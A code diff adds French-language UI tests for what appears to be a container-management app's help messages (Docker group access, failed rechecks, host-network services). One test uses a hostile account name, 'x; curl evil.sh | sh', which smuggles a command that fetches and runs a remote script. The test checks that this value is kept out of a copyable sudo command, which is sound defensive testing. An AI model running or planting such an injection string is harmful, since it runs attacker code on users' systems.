@@ -265,6 +265,34 @@ describe("aide propre à la distribution (BR-ENGINE-005, 007, 017)", () => {
     wrapper.unmount();
   });
 
+  it("accès refusé, nom de compte hostile : jamais dans le bloc à recopier, l'emplacement littéral à la place", async () => {
+    const hostile = "x; curl evil.sh | sh";
+    const { wrapper } = await open((bridge) =>
+      bridge.services.seed("forge", [], {
+        state: "access_denied",
+        agentAccount: hostile,
+        agentIsAdmin: false,
+      }),
+    );
+    expect(wrapper.get("pre").text()).toBe("sudo usermod -aG docker <compte-de-l-agent>");
+    expect(wrapper.get("pre").text()).not.toContain("curl");
+    expect(wrapper.get("[data-help-note]").text()).toContain("<compte-de-l-agent>");
+    wrapper.unmount();
+  });
+
+  it("accès refusé, nom de compte valide : repris dans la commande, sans note", async () => {
+    const { wrapper } = await open((bridge) =>
+      bridge.services.seed("forge", [], {
+        state: "access_denied",
+        agentAccount: "hearth",
+        agentIsAdmin: false,
+      }),
+    );
+    expect(wrapper.get("pre").text()).toBe("sudo usermod -aG docker hearth");
+    expect(wrapper.find("[data-help-note]").exists()).toBe(false);
+    wrapper.unmount();
+  });
+
   it("accès refusé à un autre compte : l'avertissement sur les pouvoirs accordés", async () => {
     const { wrapper } = await open((bridge) =>
       bridge.services.seed("forge", [], {
@@ -554,6 +582,45 @@ describe("liaison coupée et agent ancien", () => {
     bridge.services.setEngine("forge", { state: "ready" });
     await flushPromises();
     expect(wrapper.find("[data-engine-recheck]").exists()).toBe(false);
+    wrapper.unmount();
+  });
+
+  it("« Vérifier à nouveau » en échec : l'état devient « Ne répond pas » (spec)", async () => {
+    const { wrapper, bridge } = await open((sim) =>
+      sim.services.seed("forge", [], { state: "stopped" }),
+    );
+    bridge.services.failRecheck = true;
+    await wrapper.get("[data-engine-recheck]").trigger("click");
+    await flushPromises();
+    const failed = wrapper.get("[data-recheck-failed]").text();
+    expect(failed).toContain("Ne répond pas");
+    expect(failed).toContain("Le moteur de conteneurs ne répond pas.");
+    wrapper.unmount();
+  });
+
+  it("moteur arrêté sans systemd : le renvoi à la documentation, sans dire que la distribution est inconnue", async () => {
+    const { wrapper } = await open((sim) =>
+      sim.services.seed("forge", [], { state: "stopped", host: { init: "other" } }),
+    );
+    expect(wrapper.find("[data-engine-docs]").exists()).toBe(true);
+    expect(wrapper.text()).not.toContain("Hearth ne reconnaît pas la distribution");
+    wrapper.unmount();
+  });
+
+  it("service sur le réseau du serveur : le dit, jamais « Aucun port »", async () => {
+    const { wrapper } = await open((sim) =>
+      sim.services.seed("forge", [
+        { key: "c_dns", name: "dns", hostNetwork: true },
+        { key: "c_plain", name: "plain" },
+      ]),
+    );
+    const dns = wrapper.get("[data-key='c_dns']");
+    expect(dns.get("[data-host-network]").text()).toBe(
+      "Utilise directement le réseau du serveur : aucun port individuel.",
+    );
+    expect(dns.text()).not.toContain("Aucun port");
+    expect(dns.attributes("aria-label")).toContain("Utilise directement le réseau du serveur");
+    expect(wrapper.get("[data-key='c_plain']").text()).toContain("Aucun port");
     wrapper.unmount();
   });
 
